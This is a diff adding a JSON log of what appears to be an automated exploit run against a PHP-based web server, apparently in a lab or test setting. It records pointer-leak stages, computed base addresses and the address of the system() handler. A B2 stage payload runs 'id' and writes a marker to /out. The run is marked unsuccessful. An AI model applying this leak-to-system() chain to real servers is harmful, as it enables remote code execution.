@@ -1,0 +1,137 @@
+{
+ "stages": [
+  {
+   "stage": "A1",
+   "rc": 0,
+   "status": "HTTP/1.0 500 Internal Server Error",
+   "bytes": 185,
+   "elapsed": 0.06
+  },
+  {
+   "stage": "B1",
+   "i": 0,
+   "bytes": 233,
+   "status": "HTTP/1.1 200 OK",
+   "leak": "err:no pointers"
+  },
+  {
+   "stage": "B1",
+   "i": 1,
+   "bytes": 233,
+   "status": "HTTP/1.1 200 OK",
+   "leak": "err:no pointers"
+  },
+  {
+   "stage": "B1",
+   "i": 2,
+   "bytes": 233,
+   "status": "HTTP/1.1 200 OK",
+   "leak": "err:no pointers"
+  },
+  {
+   "stage": "B1",
+   "i": 3,
+   "bytes": 1687015,
+   "status": "HTTP/1.1 200 OK",
+   "decoded": 819208,
+   "lib": "0x7f0c2c068000",
+   "cands": {
+    "0x7f0c2b000000": 88,
+    "0x7f0c1de00000": 79,
+    "0x7f0c1e600000": 6
+   },
+   "main": "0x7f0c2b000000",
+   "leak": "hit",
+   "chosen": true
+  },
+  {
+   "stage": "B1",
+   "i": 4,
+   "bytes": 233,
+   "status": "HTTP/1.1 200 OK",
+   "leak": "err:no pointers"
+  },
+  {
+   "stage": "A2",
+   "i": 0,
+   "bytes": 185,
+   "status": "HTTP/1.0 500 Internal Server Error"
+  },
+  {
+   "stage": "B2",
+   "i": 0,
+   "bytes": 233,
+   "status": "HTTP/1.1 200 OK"
+  },
+  {
+   "stage": "B2",
+   "i": 1,
+   "bytes": 233,
+   "status": "HTTP/1.1 200 OK"
+  },
+  {
+   "stage": "B2",
+   "i": 2,
+   "bytes": 233,
+   "status": "HTTP/1.1 200 OK"
+  },
+  {
+   "stage": "B2",
+   "i": 3,
+   "bytes": 233,
+   "status": "HTTP/1.1 200 OK"
+  },
+  {
+   "stage": "B2",
+   "i": 4,
+   "bytes": 169,
+   "status": "HTTP/1.1 200 OK"
+  },
+  {
+   "stage": "B2",
+   "i": 5,
+   "bytes": 233,
+   "status": "HTTP/1.1 200 OK"
+  },
+  {
+   "stage": "B2",
+   "i": 6,
+   "bytes": 233,
+   "status": "HTTP/1.1 200 OK"
+  },
+  {
+   "stage": "B2",
+   "i": 7,
+   "bytes": 233,
+   "status": "HTTP/1.1 200 OK"
+  }
+ ],
+ "success": false,
+ "marker": "CTL115",
+ "zif_off": "0x24cdd0",
+ "zdtor_off": "0x424ff0",
+ "s_off": "0xf7398",
+ "a1": {
+  "bytes": 1060211,
+  "sha256": "8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6"
+ },
+ "b1": {
+  "bytes": 33128677,
+  "sha256": "b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2"
+ },
+ "S": "0x7f0c2b0f7398",
+ "zif_system": "0x7f0c2c2b4dd0",
+ "main": "0x7f0c2b000000",
+ "lib": "0x7f0c2c068000",
+ "lib_minus_main": "0x1068000",
+ "a2": {
+  "bytes": 279369,
+  "sha256": "7af66c8f35c5fa6b47a539da6dca361d19543d9f62d61e4af891c2802bd5e236"
+ },
+ "b2": {
+  "bytes": 451384,
+  "cmd": "id>/out/p1_conc_CTL115;echo CTL115>>/out/p1_conc_CTL115;id>&2;echo CTL115>&2",
+  "sha256": "741cb4da9aa7bb888e4bdec2afcf856f8dc7a72e67067fc8296cf2c664dd5d82"
+ },
+ "proof": ""
+}
